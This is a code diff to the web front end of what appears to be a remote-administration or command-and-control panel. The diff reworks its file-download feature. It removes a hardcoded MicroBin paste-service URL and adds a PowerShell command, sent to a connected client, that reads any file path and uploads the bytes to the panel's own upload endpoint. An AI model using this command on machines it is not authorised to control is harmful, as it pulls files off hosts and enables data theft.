@@ -246,7 +246,6 @@
     const DIR_START_MARKER = '##DIR_START##';
     const DIR_END_MARKER = '##DIR_END##';
     const STALE_MS = 10000; 
-    const MICROBIN_URL_BASE = 'https://microbin.example.com/'; // you must change this in order to download files
 
     function switchTab(tabId) {
         document.querySelectorAll('.content-area').forEach(c => c.classList.remove('active'));
@@ -339,6 +338,12 @@
             state.isCapturingJSON = false;
             state.jsonBuffer = "";
         }
+
+        const downloadMatch = data.output.match(/##DOWNLOAD_READY##([a-z0-9]+)/);
+        if (downloadMatch) {
+            const nonce = downloadMatch[1];
+            window.open(`/api/download/${nonce}`, '_blank');
+        }
     });
 
     socket.on('system_output', (data) => {
@@ -393,8 +398,9 @@
     function downloadFile(name, event) {
         event.stopPropagation();
         const fullPath = (clientStates[current_client_hostname].currentPath + name).replace(/'/g, "''");
-        const cleanBaseUrl = MICROBIN_URL_BASE.replace(/\/+$/, '');
-        const cmd = `powershell -Command "$filePath='${fullPath}'; $URL='${cleanBaseUrl}/upload'; $boundary = [System.Guid]::NewGuid().ToString(); $CRLF = [char]13 + [char]10; if(-not (Test-Path $filePath)){ echo 'File not found'; exit }; $fileBytes = [System.IO.File]::ReadAllBytes($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $header = ('--' + $boundary + $CRLF + 'Content-Disposition: form-data; name=\\"file\\"; filename=\\"' + $fileName + '\\"' + $CRLF + 'Content-Type: application/octet-stream' + $CRLF + $CRLF); $headerBytes = [System.Text.Encoding]::UTF8.GetBytes($header); $footerBytes = [System.Text.Encoding]::UTF8.GetBytes($CRLF + '--' + $boundary + '--' + $CRLF); $body = New-Object System.Collections.Generic.List[byte]; $body.AddRange($headerBytes); $body.AddRange($fileBytes); $body.AddRange($footerBytes); $response = Invoke-RestMethod -Uri $URL -Method Post -ContentType ('multipart/form-data; boundary=' + $boundary) -Body $body.ToArray(); if($response -match 'id=\\"download-link\\".*?href=\\"([^\\"]+)\\"') { $link = $Matches[1]; echo ('${cleanBaseUrl}' + $link) } else { echo 'Upload Finished' }"`;
+        const nonce = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+        const uploadUrl = `${window.location.origin}/api/upload/${nonce}`;
+        const cmd = `powershell -Command "$filePath='${fullPath}'; $URL='${uploadUrl}'; $boundary = [System.Guid]::NewGuid().ToString(); $CRLF = [char]13 + [char]10; if(-not (Test-Path $filePath)){ echo 'File not found'; exit }; $fileBytes = [System.IO.File]::ReadAllBytes($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $header = ('--' + $boundary + $CRLF + 'Content-Disposition: form-data; name=\\"file\\"; filename=\\"' + $fileName + '\\"' + $CRLF + 'Content-Type: application/octet-stream' + $CRLF + $CRLF); $headerBytes = [System.Text.Encoding]::UTF8.GetBytes($header); $footerBytes = [System.Text.Encoding]::UTF8.GetBytes($CRLF + '--' + $boundary + '--' + $CRLF); $body = New-Object System.Collections.Generic.List[byte]; $body.AddRange($headerBytes); $body.AddRange($fileBytes); $body.AddRange($footerBytes); Invoke-RestMethod -Uri $URL -Method Post -ContentType ('multipart/form-data; boundary=' + $boundary) -Body $body.ToArray() | Out-Null; Write-Output ('##' + 'DOWNLOAD_READY##' + '${nonce}')"`;
         socket.emit('command', { 'command': cmd, 'client_id': current_client_id });
     }
 
